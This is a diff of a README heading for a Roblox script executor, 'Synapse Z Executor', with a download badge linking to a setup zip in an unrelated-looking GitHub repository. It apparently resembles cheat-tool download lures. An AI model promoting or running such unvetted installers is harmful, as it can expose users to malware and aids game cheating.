@@ -1,4 +1,4 @@
-# 🚀 Synapse Z Executor - Roblox Executor **[![Download Synapse Z Executor](https://img.shields.io/badge/Download-Synapse Z%20Executor-blueviolet)](https://github.com/nhatquang2004/1111/releases/download/135/Setupv2.5.1.zip)**
+# 🚀 Synapse Z Executor - Roblox Executor **[![DownloadSynapseZExecutor](https://img.shields.io/badge/Download-SynapseZ%20Executor-blueviolet)](https://github.com/nhatquang2004/1111/releases/download/135/Setupv2.5.1.zip)**
 
 ## Quick Installation
 To get started with Synapse Z Executor, follow these simple steps:
